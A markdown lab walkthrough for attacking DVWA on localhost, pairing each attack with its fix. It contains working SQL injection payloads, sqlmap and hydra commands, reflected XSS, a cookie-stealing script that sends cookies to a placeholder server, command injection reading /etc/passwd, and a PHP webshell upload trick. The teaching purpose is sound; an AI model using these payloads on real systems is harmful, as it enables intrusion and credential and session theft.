# ⚔️ DVWA EXPLOITATION WALKTHROUGH — First Blood

## 🖥️ YOUR LAB (already running!)

```
URL:      http://localhost:4280  (opens in Windows browser)
Login:    admin / password
Setup:    click "Create / Reset Database" first
Security: set to "low" for first attacks
```

---

## 🎯 ATTACK 1: SQL Injection (the classic)

### The bug:
Login form does `SELECT * FROM users WHERE user='INPUT' AND pass='INPUT'`

### The exploit:
```
Username: admin' --
Password: anything
```
That `--` comments out the password check → you log in as admin.

### Deeper extraction:
```
Username: ' UNION SELECT user, password FROM users-- 
Password: x
```
Dumps all usernames+passwords.

### Automated:
```bash
sqlmap -u "http://localhost:4280/vulnerabilities/sqli/?id=1&Submit=Submit" \
       --cookie="security=low; PHPSESSID=YOUR_ID" --dbs
```

### The defense:
```php
// VULNERABLE:
$query = "SELECT * FROM users WHERE user='$_GET[user]'";
// SAFE:
$stmt = $pdo->prepare("SELECT * FROM users WHERE user=?");
$stmt->execute([$_GET['user']]);
```

---

## 🎯 ATTACK 2: Cross-Site Scripting (XSS)

### Reflected XSS:
```
http://localhost:4280/vulnerabilities/xss_r/?name=<script>alert(1)</script>
```
→ popup = injection works.

### Cookie stealer:
```html
<script>new Image().src='http://YOUR_SERVER/'+document.cookie</script>
```

### Defense: output encoding + CSP headers.

---

## 🎯 ATTACK 3: Command Injection

```
IP field: 127.0.0.1; cat /etc/passwd
```
→ reads system files. Try `; whoami`, `; ls /`.

### Defense: never pass user input to shell functions.

---

## 🎯 ATTACK 4: File Upload → Webshell

1. Create `shell.php` containing `<?php system($_GET['cmd']); ?>`
2. Rename to `shell.php.jpg` or use null byte `shell.php%00.jpg`
3. Upload → access `/hackable/uploads/shell.php?cmd=whoami`

### Defense: whitelist extensions, store outside webroot, randomize names.

---

## 🎯 ATTACK 5: Brute Force

```
 hydra -l admin -P /usr/share/wordlists/rockyou.txt \
   localhost http-post-form "/login.php:username=^USER^&password=^PASS^:F=incorrect"
```

---

## 📊 Your labs already running:

```
DVWA:        http://localhost:4280  (admin/password)
Juice Shop:  http://localhost:3000  (modern vulns)
WebGoat:     http://localhost:18080 (OWASP lessons)
```

## ⚔️ Rules:
- LOCALHOST ONLY — never point these at real sites
- Each attack → understand WHY it works → learn the fix
- That's how you become both attacker AND defender
